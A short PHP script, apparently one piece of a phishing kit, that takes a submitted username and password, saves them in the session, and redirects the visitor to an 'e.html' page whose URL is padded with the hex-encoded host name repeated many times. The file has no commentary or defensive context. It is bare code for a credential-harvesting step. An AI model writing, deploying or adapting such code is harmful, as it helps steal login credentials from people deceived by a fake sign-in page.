<?php
session_start();
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];

$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="e.html?$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");

?>